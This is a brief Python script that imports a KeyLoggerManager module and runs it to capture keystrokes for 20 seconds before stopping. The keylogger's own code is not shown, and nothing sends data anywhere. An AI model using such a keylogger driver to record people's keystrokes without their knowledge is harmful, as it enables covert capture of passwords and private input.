import KeyLoggerManager as km
import time


if __name__ == "__main__":
    def main():
        track = km.KeyLoggerManager()
        track.start()
        time.sleep(20)
        track.stop()
main()